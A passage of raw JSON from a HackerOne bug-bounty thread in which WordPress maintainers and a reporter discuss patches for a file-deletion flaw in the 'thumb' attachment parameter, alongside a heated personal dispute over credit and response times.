one?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-24T13:56:03.573Z","updated_at":"2018-05-24T13:56:03.573Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2938874,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey everyone,\n\nI've spent the past 5 hours investigating this, and am attaching what I believe is the best available patch given the circumstances and requirements.\n\nAll it does is run `$_POST['thumb']` through `validate_file()` and `wp_die()` on failure.\n\n----\n\nMy reasoning with such a simple approach only on submission, is that WordPress does not perform any file path protection elsewhere. If we _are_ going to introduce a safety measure to prevent critical file deletion (and my personal opinion is that we should) that fix should be handled globally, in such a way that plugins and themes opting into using `wp_delete_file()` would be protected, and outside of this fix specifically.\n\nPlugins or themes calling `unlink()` directly will always be free to behave badly, and WordPress should provide the best tooling within itself as an application to prevent accidents, while trusting the rest of the server to be configured in such a way that important application files (like WordPress core files) cannot be blindly unlinked.\n\n----\n\nMy attached patch is a backwards compatibility break. Plugins attempting to pass a relative file path to this very-old `'thumb'` parameter (normally only accessed via a pre-3.0 admin screen) will now fail, but I believe that break is worth it here, given both the age of that code and how unlikely it is to be relied upon in the wild.\n\nWe try to get consensus from the team when backwards compatibility breaks are necessary. It's also possible my suggested fix is not the best approach, but this is my progress from tonight so I wanted to update everyone.\n\n----\n\nIt's hard to put into words how frustrating and embarrassing it is for issues to go stale like this one did, from both sides of the issue fwiw. I'm sorry this went ignored. I know my apology means very little, but it needs to be said and I do feel all of these things.\n\nWhen there is progress, one of us will update here.\n\nThanks,\n-JJJ","markdown_message":"\u003cp\u003eHey everyone,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve spent the past 5 hours investigating this, and am attaching what I believe is the best available patch given the circumstances and requirements.\u003c/p\u003e\n\n\u003cp\u003eAll it does is run \u003ccode\u003e$_POST[\u0026#39;thumb\u0026#39;]\u003c/code\u003e through \u003ccode\u003evalidate_file()\u003c/code\u003e and \u003ccode\u003ewp_die()\u003c/code\u003e on failure.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eMy reasoning with such a simple approach only on submission, is that WordPress does not perform any file path protection elsewhere. If we \u003cu\u003eare\u003c/u\u003e going to introduce a safety measure to prevent critical file deletion (and my personal opinion is that we should) that fix should be handled globally, in such a way that plugins and themes opting into using \u003ccode\u003ewp_delete_file()\u003c/code\u003e would be protected, and outside of this fix specifically.\u003c/p\u003e\n\n\u003cp\u003ePlugins or themes calling \u003ccode\u003eunlink()\u003c/code\u003e directly will always be free to behave badly, and WordPress should provide the best tooling within itself as an application to prevent accidents, while trusting the rest of the server to be configured in such a way that important application files (like WordPress core files) cannot be blindly unlinked.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eMy attached patch is a backwards compatibility break. Plugins attempting to pass a relative file path to this very-old \u003ccode\u003e\u0026#39;thumb\u0026#39;\u003c/code\u003e parameter (normally only accessed via a pre-3.0 admin screen) will now fail, but I believe that break is worth it here, given both the age of that code and how unlikely it is to be relied upon in the wild.\u003c/p\u003e\n\n\u003cp\u003eWe try to get consensus from the team when backwards compatibility breaks are necessary. It\u0026#39;s also possible my suggested fix is not the best approach, but this is my progress from tonight so I wanted to update everyone.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eIt\u0026#39;s hard to put into words how frustrating and embarrassing it is for issues to go stale like this one did, from both sides of the issue fwiw. I\u0026#39;m sorry this went ignored. I know my apology means very little, but it needs to be said and I do feel all of these things.\u003c/p\u003e\n\n\u003cp\u003eWhen there is progress, one of us will update here.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n-JJJ\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-27T01:58:28.682Z","updated_at":"2018-06-27T02:00:30.401Z","actor":{"username":"jjj","cleared":false,"url":"/jjj","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/063/b21324cc7d9861888c1ddd4fa345cda6612361ff_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":312748,"filename":"editattachment.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/312/748/ce8c0fc2d4bfc7f8e3614b7fe25634e814e17c18/editattachment.patch?response-content-disposition=attachment%3B%20filename%3D%22editattachment.patch%22%3B%20filename%2A%3DUTF-8%27%27editattachment.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052537Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=40fed0d250e29cd73734330fc064acf30c505e65a2ff5fd4ca537acfb451bc2c"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2939831,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Speaking as me/Slavco personally:\n \nIf you take into consideration the input sanitation approach then you should make sure every place in the core where postmeta key inserting is possible to be sanitized in case of \"thumb\" key. This solution except breaking precious backward compatibility does very little, almost nothing from security aspect. Editors still are able to perform this attack, Authors are able to carry this attack via XMLRPC, what about wordpress-importer enabled setups, ... \n\nAnyone of you doesn't deserve single letter in the form of reply and help due your behavior in the previous reports from my side, but open source and safety of the users world wide are much more important than your ignorance and discrimination especially towards me.\n\n","markdown_message":"\u003cp\u003eSpeaking as me/Slavco personally:\u003c/p\u003e\n\n\u003cp\u003eIf you take into consideration the input sanitation approach then you should make sure every place in the core where postmeta key inserting is possible to be sanitized in case of \u0026quot;thumb\u0026quot; key. This solution except breaking precious backward compatibility does very little, almost nothing from security aspect. Editors still are able to perform this attack, Authors are able to carry this attack via XMLRPC, what about wordpress-importer enabled setups, ... \u003c/p\u003e\n\n\u003cp\u003eAnyone of you doesn\u0026#39;t deserve single letter in the form of reply and help due your behavior in the previous reports from my side, but open source and safety of the users world wide are much more important than your ignorance and discrimination especially towards me.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-27T08:35:45.509Z","updated_at":"2018-06-27T08:35:45.509Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2943179,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Slavco,\n\nIt seems like you reached out to someone pointing out that we were on the wrong track with the patch. I agree and we've been working on a very different patch for a most of the day, and when the person pinged me privately it made me realize that we hadn't uploaded the new patch here yet. I'm going to try to get the latest iteration of it and upload it here really soon.\n\nThanks,\nAaron","markdown_message":"\u003cp\u003eHey Slavco,\u003c/p\u003e\n\n\u003cp\u003eIt seems like you reached out to someone pointing out that we were on the wrong track with the patch. I agree and we\u0026#39;ve been working on a very different patch for a most of the day, and when the person pinged me privately it made me realize that we hadn\u0026#39;t uploaded the new patch here yet. I\u0026#39;m going to try to get the latest iteration of it and upload it here really soon.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-28T01:02:24.024Z","updated_at":"2018-06-28T01:02:24.024Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2943327,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's another patch @slavco, can you take a look and tell me what you think? It brings the enforcement to where the unlinking is actually happening.\n\nIt looks like the plan will be to push out an update early next week. When this is all fixed and pushed out, we'd still like to look into some additional hardening to `wp_delete_file` and heavier usage of it throughout the codebase, but that will be a longer process.","markdown_message":"\u003cp\u003eHere\u0026#39;s another patch \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e, can you take a look and tell me what you think? It brings the enforcement to where the unlinking is actually happening.\u003c/p\u003e\n\n\u003cp\u003eIt looks like the plan will be to push out an update early next week. When this is all fixed and pushed out, we\u0026#39;d still like to look into some additional hardening to \u003ccode\u003ewp_delete_file\u003c/code\u003e and heavier usage of it throughout the codebase, but that will be a longer process.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-28T01:20:40.071Z","updated_at":"2018-06-28T01:20:40.071Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":313067,"filename":"291878.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/313/067/acd2d5c8e482c8776e79340b185d59b3c4b647bb/291878.diff?response-content-disposition=attachment%3B%20filename%3D%22291878.diff%22%3B%20filename%2A%3DUTF-8%27%27291878.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052537Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=c361d9ff045c971e26a6946419dff312d6fa0a83eec36149e290cfe77149cf1a"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2946533,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There was a copy/paste error on like 30 in that last patch. Here is the fixed version.","markdown_message":"\u003cp\u003eThere was a copy/paste error on like 30 in that last patch. Here is the fixed version.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-28T13:41:26.520Z","updated_at":"2018-06-28T13:41:26.520Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":313233,"filename":"291878.diff","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/313/233/436345b8e75c696b4c3a53ce326ad918ce31c54f/291878.diff?response-content-disposition=attachment%3B%20filename%3D%22291878.diff%22%3B%20filename%2A%3DUTF-8%27%27291878.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUYGCYHJT%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052537Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAGSCCKi0CRpYJMt3KX5x%2BNM9j2K4mM4glLH6mZ%2B8ExKAiEAlsZG1%2FfIYq0ODDSxwLnZfWyc08bfINN86QAI3Hqr4MgqtAMIURABGgwwMTM2MTkyNzQ4NDkiDG9txF7r12Yekik2WSqRA6NC8vsgwir7JTQr5zVnxH1x6efNaMXQv0rW73VsI4xDf6Ldo8AdQq%2B7eYd4BvolwrfpyHLOFrZnF4wc7R9rEQKh%2FswFKL9GQ6Lp2ujYTvyC5dhdjS4Sq%2F%2BYvPk3joZ%2BEwcDqk%2B5AvxLFqoiv3Y3ts7f9HYBqcl%2Fu20T7ZA6XxU9V7asrN5LT6SJz4xOu7iZzuPeZs4%2BFaw8tgu5A3W6CYmUUmbBs9q%2FQ%2FCO3t50tS7Dm5k%2BKM04Ar1VaXlWDuLdZKMC%2FS80%2FwDwH66vWVAjLib7jCkgBWXGEa9VryBHJJUl3qrXQrTIED1gUKeOoKk3fYvvyyIMJs3ja%2BbbO56fim%2BodEtN1FBU6g%2BuddJ4Qz5521XYpzwatC5mjJs6D50zWyfJnn9Xf%2FrDe3EacAX3oOhEBj%2Fu9S%2B46jeCaMjfEHwW8T%2FFnFpu%2FZf3e1NchqIFhOkEcnGH%2FqNmQtJ54g5I6x8j4N2c70CE7tuCZI1qjgi%2BfUfSwopFGky44IARFjLnTewCnMtMfFUa7haJa9C%2BcuqvMJDfqf8FOusB7%2BAWx%2FH2B4H9I7hLf9GkPQtz9yMVcytbF7umUu9c2W6aIn%2FKCYsmcfqyPQD%2Fe6EdfKQiWwtKrHes32q91jeUCiYfrRJFByq7uDxHGN0MingOOUWy72n3fdpooUwYjRfpac06PpxBSGvwEeiL%2BJlq9wl2E%2FMxojMrovyONCSYEoBpeEbNgMNFb9rpTiIW%2BX8OzRH6ra3L9dgd9y8nuqoCkIGYzNActVtKbpERxbtmkIoGAgtSCCLLfHT65g2k6G9afrZJZC86IhNmvJrDSG%2BKELC3%2BeAfU64DhUDssT9Dd%2Bm2pU0nRk1s8PUjuQ%3D%3D\u0026X-Amz-Signature=ebfb70e46436e974b944fc79c40c1c980eec1e642cee979b818bdabbbcbfd3b4"}],"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2958861,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Solution isn't good at all. Stay tuned I'll explain in details in 3 months from now. ","markdown_message":"\u003cp\u003eSolution isn\u0026#39;t good at all. Stay tuned I\u0026#39;ll explain in details in 3 months from now. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-29T12:46:15.424Z","updated_at":"2018-06-29T12:46:15.424Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2958953,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey Slavco,\n\nWhile I like to think I appreciate sarcasm and snark as much as most, it certainly makes our job harder here. I understand that you're frustrated at the time this report took, but when you asked for a timeframe 5 months ago I estimated 6 months saying \"it should be fixed by the end of July\" and you said that was fine (well, you gave it a \"+1\").\n\nWe didn't get the full 6 months because of the RIPS post, but we really would like to get a reliable solution in place for a release next week. Any actionable feedback would be appreciated.\n\nThanks,\nAaron","markdown_message":"\u003cp\u003eHey Slavco,\u003c/p\u003e\n\n\u003cp\u003eWhile I like to think I appreciate sarcasm and snark as much as most, it certainly makes our job harder here. I understand that you\u0026#39;re frustrated at the time this report took, but when you asked for a timeframe 5 months ago I estimated 6 months saying \u0026quot;it should be fixed by the end of July\u0026quot; and you said that was fine (well, you gave it a \u0026quot;+1\u0026quot;).\u003c/p\u003e\n\n\u003cp\u003eWe didn\u0026#39;t get the full 6 months because of the RIPS post, but we really would like to get a reliable solution in place for a release next week. Any actionable feedback would be appreciated.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-29T13:26:36.928Z","updated_at":"2018-06-29T13:26:36.928Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2959435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Now we are talking! \nI'm really happy I see you have start counting, that is good habit especially when you handle security of the most popular web project. What is said on this report here https://hackerone.com/reports/253495 , m? \nI'm also more than pleased I'm reading that my feedback \"would be appreciated\" due the fact wasn't the case in the past. See this https://hackerone.com/reports/179920 .\nRegarding discrimination I would also like to point out to the DB prepare method debacle for you, you have acknowledge and gave reward to the person who rewrite my own work and that makes you a thief!  Yes Aaron, you personally and Matt because you are the man responsible for security of the WordPress and Matt as person who put you there. \nNow you can see that I'm not frustrated at all, opposite I'm happy seeing you in this position and that is the result of my battle towards you (not personally, but as authority ) which is noble and makes internet safer place while shows you in the real light.\nIs this strange to you? Maybe I doesn't sound as a person who answered on your emails while I was reporting prepare issue on security at wordpress ? I'm the same, you and your attitude is changed, but you have overlooked very important thing and that is the one I'm not under you in the hierarchy, but we are the same, due the fact I'm the REPORTER and RESEARCHER! \nNow you can fix everything you have messed up right there https://hackerone.com/reports/179920 and feel free to contact me on any communication channel, I don't bite, I audit code ;)\n\np.s. \nSolution isn't good at all. Stay tuned I'll explain in details in 1 ( not 3 because you show little regret regarding the situation you put wp in) month from now.","markdown_message":"\u003cp\u003eNow we are talking! \u003cbr\u003e\nI\u0026#39;m really happy I see you have start counting, that is good habit especially when you handle security of the most popular web project. What is said on this report here \u003ca title=\"https://hackerone.com/reports/253495\" href=\"https://hackerone.com/reports/253495\"\u003ehttps://hackerone.com/reports/253495\u003c/a\u003e , m? \u003cbr\u003e\nI\u0026#39;m also more than pleased I\u0026#39;m reading that my feedback \u0026quot;would be appreciated\u0026quot; due the fact wasn\u0026#39;t the case in the past. See this \u003ca title=\"https://hackerone.com/reports/179920\" href=\"https://hackerone.com/reports/179920\"\u003ehttps://hackerone.com/reports/179920\u003c/a\u003e .\u003cbr\u003e\nRegarding discrimination I would also like to point out to the DB prepare method debacle for you, you have acknowledge and gave reward to the person who rewrite my own work and that makes you a thief!  Yes Aaron, you personally and Matt because you are the man responsible for security of the WordPress and Matt as person who put you there. \u003cbr\u003e\nNow you can see that I\u0026#39;m not frustrated at all, opposite I\u0026#39;m happy seeing you in this position and that is the result of my battle towards you (not personally, but as authority ) which is noble and makes internet safer place while shows you in the real light.\u003cbr\u003e\nIs this strange to you? Maybe I doesn\u0026#39;t sound as a person who answered on your emails while I was reporting prepare issue on security at wordpress ? I\u0026#39;m the same, you and your attitude is changed, but you have overlooked very important thing and that is the one I\u0026#39;m not under you in the hierarchy, but we are the same, due the fact I\u0026#39;m the REPORTER and RESEARCHER! \u003cbr\u003e\nNow you can fix everything you have messed up right there \u003ca title=\"https://hackerone.com/reports/179920\" href=\"https://hackerone.com/reports/179920\"\u003ehttps://hackerone.com/reports/179920\u003c/a\u003e and feel free to contact me on any communication channel, I don\u0026#39;t bite, I audit code ;)\u003c/p\u003e\n\n\u003cp\u003ep.s. \u003cbr\u003e\nSolution isn\u0026#39;t good at all. Stay tuned I\u0026#39;ll explain in details in 1 ( not 3 because you show little regret regarding the situation you put wp in) month from now.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-29T16:20:14.590Z","updated_at":"2018-06-29T16:21:12.825Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2959976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @slavco,\n\nAs of right now, we are targeting early next week to release a WordPress update to fix this. Obviously we don't want to release a solution that doesn't fix the issue, and we would really like to work with you on this issue. Any constructive feedback you are able to supply before then, whether in details or patches, would be greatly appreciated!\n\n-Aaron","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eAs of right now, we are targeting early next week to release a WordPress update to fix this. Obviously we don\u0026#39;t want to release a solution that doesn\u0026#39;t fix the issue, and we would really like to work with you on this issue. Any constructive feedback you are able to supply before then, whether in details or patches, would be greatly appreciated!\u003c/p\u003e\n\n\u003cp\u003e-Aaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-29T19:01:36.422Z","updated_at":"2018-06-29T19:01:36.422Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2966670,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh, you understood nothing! Please read carefully [again](https://hackerone.com/bugs?subject=user\u0026report_id=291878\u0026view=open\u0026substates%5B%5D=new\u0026substates%5B%5D=needs-more-info\u0026substates%5B%5D=triaged\u0026substates%5B%5D=pre-submission\u0026reported_to_team=\u0026text_query=\u0026program_states%5B%5D=2\u0026program_states%5B%5D=3\u0026program_states%5B%5D=4\u0026program_states%5B%5D=5\u0026sort_type=latest_activity\u0026sort_direction=descending\u0026limit=25\u0026page=1#activity-2959435) You really can't notice that shameless thief without any regret who always place the guilty towards another people means nothing to me? ","markdown_message":"\u003cp\u003eOh, you understood nothing! Please read carefully \u003ca href=\"https://hackerone.com/bugs?subject=user\u0026amp;report_id=291878\u0026amp;view=open\u0026amp;substates%5B%5D=new\u0026amp;substates%5B%5D=needs-more-info\u0026amp;substates%5B%5D=triaged\u0026amp;substates%5B%5D=pre-submission\u0026amp;reported_to_team=\u0026amp;text_query=\u0026amp;program_states%5B%5D=2\u0026amp;program_states%5B%5D=3\u0026amp;program_states%5B%5D=4\u0026amp;program_states%5B%5D=5\u0026amp;sort_type=latest_activity\u0026amp;sort_direction=descending\u0026amp;limit=25\u0026amp;page=1#activity-2959435\"\u003eagain\u003c/a\u003e You really can\u0026#39;t notice that shameless thief without any regret who always place the guilty towards another people means nothing to me? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-30T20:56:42.201Z","updated_at":"2018-06-30T20:56:42.201Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2966703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fool me [once](https://hackerone.com/reports/179920), shame on you. Fool me twice, shame on me (reports 253495 \u0026 29187). ","markdown_message":"\u003cp\u003eFool me \u003ca href=\"https://hackerone.com/reports/179920\"\u003eonce\u003c/a\u003e, shame on you. Fool me twice, shame on me (reports 253495 \u0026amp; 29187). \u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-30T21:22:32.638Z","updated_at":"2018-06-30T21:22:32.638Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2975073,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-02T16:02:38.747Z","updated_at":"2018-07-02T16:02:38.747Z","actor":{"username":"johnbillion","cleared":false,"url":"/johnbillion","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/083/8a397390a09844d8b0657ea57e4203abd852bb2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2995708,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @slavco,\n\nI'm closing this as resolved as the release with the fix in it 